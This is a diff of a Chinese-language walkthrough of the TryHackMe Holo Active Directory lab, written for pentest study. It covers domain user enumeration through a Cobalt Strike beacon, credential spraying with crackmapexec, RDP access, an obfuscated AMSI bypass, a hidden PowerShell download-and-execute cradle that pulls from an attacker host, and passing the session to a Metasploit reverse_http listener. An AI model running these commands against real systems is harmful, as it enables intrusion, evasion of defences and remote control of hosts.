@@ -1097,18 +1097,18 @@ PORT     STATE SERVICE       VERSION
 
 点击Forgot password，输入数据库里找到的另一个用户名：```gurag```，在浏览器打开f12调试，查看发送过去服务器的包
 
-![img](1659580867657.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659580867657.jpg)
 
 在浏览器调试工具的```storage->user_token->size```得到cookie大小：110
 
 看到生成了一个user_token，复制它，作为传入参数放到url上的user_token
 
-![img](1659580975880.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659580975880.jpg)
 
 
 此时来到一个密码reset页面，输入我们重置的密码
 
-![img](1659581100182.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659581100182.jpg)
 
 
 **Task 28  Web App Exploitation Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens**
@@ -1148,11 +1148,11 @@ PORT     STATE SERVICE       VERSION
 
 利用burp很容易就可以绕过
 
-![img](1659593558274.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659593558274.jpg)
 
 在```images```这个文件夹可以访问到我们上传到php文件
 
-![img](1659593622049.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659593622049.jpg)
 
 
 现在上传一个win版本的rev.php，拿到一个shell
@@ -1210,12 +1210,12 @@ PS C:\web\htdocs\images>
 
 开启CS
 
-![img](1659594856781.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659594856781.jpg)
 
 
 拿到一个beacon
 
-![img](1659595176870.jpg)
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659595176870.jpg)
 
 域信息枚举
 
@@ -1273,6 +1273,29 @@ PC-FILESRV01.holo.live
 S-SRV01.holo.live     
 S-SRV02.holo.live   
 ```
+
+获取所有域用户
+```
+beacon> run net users /domain
+[*] Tasked beacon to run: net users /domain
+[+] host called home, sent: 35 bytes
+[+] received output:
+The request will be processed at a domain controller for domain holo.live.
+
+
+User accounts for \\DC-SRV01.holo.live
+
+-------------------------------------------------------------------------------
+ad-joiner                Administrator            a-fubukis                
+a-koronei                ameliaw                  cocok                    
+cryillic                 fubukis                  Guest                    
+gurag                    koronei                  krbtgt                   
+matsurin                 mikos                    okayun                   
+PC-MGR                   spooks                   SRV-ADMIN                
+watamet                  WEB-MGR                  
+
+```
+
 
 获取所有DA
 ```
@@ -1340,14 +1363,310 @@ SID               : S-1-5-21-471847105-3603022926-1728018720-1132
 使用cme验证上面的用户密码,扫描AD所在网段（我这里是114）有权限的机器
 
 ```
-proxychains crackmapexec smb 10.200.114.0/24 -u watamet -d holo.live -p 'Nothingtoworry!'
+proxychains crackmapexec smb 10.200.114.0/24 -u watamet -d HOLOLIVE -p 'Nothingtoworry!'
 
 <skip..>
 
-[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.114.157:445 SMB         10.200.114.31   445    S-SRV01          [+] holo.live\watamet:Nothingtoworry! (Pwn3d!)
-SMB         10.200.114.30   445    DC-SRV01         [+] holo.live\watamet:Nothingtoworry!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.200:445 SMB         10.200.114.30   445    DC-SRV01         [+] holo.live\watamet:Nothingtoworry!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.147:445 SMB         10.200.114.35   445    PC-FILESRV01     [+] holo.live\watamet:Nothingtoworry! 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.114.216:445 SMB         10.200.114.31   445    S-SRV01          [+] holo.live\watamet:Nothingtoworry! (Pwn3d!)
+
 ```
 
 对```10.200.114.31```有管理员权限
+对```10.200.114.30```可以进行身份验证
+对```10.200.114.35```可以进行身份验证
 
-再次验证
+**Task 36  Post Exploitation That's not a cat that's a dawg**
+
+> What domain user's credentials can we dump on S-SRV01?
+
+> watamet
+
+> What is the domain user's password that we can dump on S-SRV01?
+
+> Nothingtoworry!
+
+**Task 37  Post Exploitation Good Intentions, Courtesy of Microsoft: Part II**
+
+> What is the hostname of the remote endpoint we can authenticate to?
+
+> PC-FILESRV01
+
+# PC-FILESRV01
+
+
+10.200.114.35是我们还没有拿下的机器
+
+对10.200.114.35进行扫描
+```
+┌──(root💀kali)-[~/tryhackme/holo]
+└─# proxychains nmap -sT -Pn 10.200.114.35 --top-ports=100                                                                                                                                                                              1 ⨯
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 22:55 EDT
+Nmap scan report for 10.200.114.35
+Host is up (0.67s latency).
+Not shown: 95 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+```
+
+开启了3389，使用rdp进行远程登录
+
+```
+proxychains xfreerdp /u:watamet /p:'Nothingtoworry!' /v:10.200.114.35 +clipboard
+```
+
+拿到foothold
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659668437954.jpg)
+
+
+绕过PS执行策略，关闭AMSI，枚举所有APPLOCKER
+
+```
+PS C:\Users\watamet> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\watamet> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+PS C:\Users\watamet> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
+PS C:\Users\watamet> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
+Name                : (Default Rule) All signed packaged apps
+Description         : Allows members of the Everyone group to run packaged apps that are signed.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 921cc481-6e17-4653-8f75-050b80acca20
+Name                : (Default Rule) All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
+Name                : (Default Rule) All files
+Description         : Allows members of the local Administrators group to run all applications.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+```
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659668859646.jpg)
+
+留意第二和第三条APPLOCKER规则里，允许任何用户在```Program Files folder```和```Windows```文件夹下执行任何程序
+
+
+使用[applocker-bypas-checker.ps1](https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1)检查可以写入的文件夹
+```
+PS C:\Users\watamet> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\watamet> cd .\Desktop\
+PS C:\Users\watamet\Desktop> certutil -urlcache -split -f "http://10.50.111.108:88/applocker-bypas-checker.ps1" applocker-bypas-checker.ps1
+****  Online  ****
+  0000  ...
+  0446
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\watamet\Desktop>
+PS C:\Users\watamet\Desktop> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\watamet\Desktop> .\applocker-bypas-checker.ps1
+[*] Processing folders recursively in C:\windows
+[+]  C:\windows\Tasks
+[+]  C:\windows\tracing
+[+]  C:\windows\System32\spool\drivers\color
+[+]  C:\windows\tracing\ProcessMonitor
+```
+
+打开 powershell，执行下面命令，拿到一个beacon
+
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.111.108:80/a'))"
+```
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659670245366.jpg)
+
+
+远程执行[SharpEDRChecker.exe](https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1)
+
+```
+beacon> execute-assembly tools/SharpEDRChecker.exe
+```
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659681143334.jpg)
+
+
+
+查看检查结果，反病毒软件主要是windows自带的windows defender
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659681691184.jpg)
+
+
+
+**Task 39  Situational Awareness So it's just fancy malware?**
+
+> What anti-malware product is employed on PC-FILESRV01?
+
+> amsi
+
+> What anti-virus product is employed on PC-FILESRV01?
+
+> windows defender
+
+
+把SeatBelt.exe上传到靶机，执行以后结果输出到output.txt
+```
+c:\Windows\Tasks>.\SeatBelt.exe -group=all >C:\Users\watamet\Desktop\output.txt
+
+c:\Windows\Tasks>
+```
+
+结果
+```
+
+====== DotNet ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed .NET Versions
+      4.7.03190
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : True
+     .NET version support AMSI   : False
+====== DpapiMasterKeys ======
+
+...
+
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed PowerShell Versions
+      2.0
+        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
+      5.1.17763.1
+...
+
+====== FileInfo ======
+  Comments                       : 
+  CompanyName                    : Microsoft Corporation
+  FileDescription                : NT Kernel & System
+  FileName                       : C:\Windows\system32\ntoskrnl.exe
+  FileVersion                    : 10.0.17763.1577 (WinBuild.160101.0800)
+
+```
+
+**Task 40  Situational Awareness SEATBELT CHECK!**
+
+> What CLR version is installed on PC-FILESRV01?
+
+> 4.0.30319
+
+> What PowerShell version is installed on PC-FILESRV01?
+
+> 5.1.17763.1
+
+> What Windows build is PC-FILESRV01 running on?
+
+> 17763.1577
+
+
+## 提权
+
+在这里我决定使用msf自动提权枚举工具
+
+从CS传递一个session给msf
+
+## session passing
+
+1. 首先在metasploit起一个监听，需要使用```windows/meterpreter/reverse_http```payload (只支持x86 Meterpreter)
+
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+payload => windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => tun0
+msf6 exploit(multi/handler) > set LPORT 8080
+LPORT => 8080
+msf6 exploit(multi/handler) > run
+[*] Started HTTP reverse handler on http://10.50.111.108:8080
+
+```
+
+2. CS建立一个监听
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659693714992.jpg)
+
+3. CS使用spawn命令传session到msf
+
+```
+beacon> spawn holo-Foreign-HTTP-msf-8080
+[*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.50.111.108:8080)
+[+] host called home, sent: 806 bytes
+```
+
+4. msf收到传过来的session
+
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started HTTP reverse handler on http://10.50.111.108:8080
+[!] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Without a database connected that payload UUID tracking will not work!
+[*] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Staging x86 payload (176220 bytes) ...
+[!] http://10.50.111.108:8080 handling request from 10.200.114.35; (UUID: oas3wlq2) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (10.50.111.108:8080 -> 127.0.0.1) at 2022-08-05 06:04:28 -0400
+
+meterpreter > getuid
+Server username: HOLOLIVE\watamet
+
+```
+
+## 提权枚举
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.200.114.35 - Collecting local exploits for x86/windows...
+[*] 10.200.114.35 - 40 exploit checks are being tried...
+[+] 10.200.114.35 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.200.114.35 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
+[+] 10.200.114.35 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[*] Post module execution completed
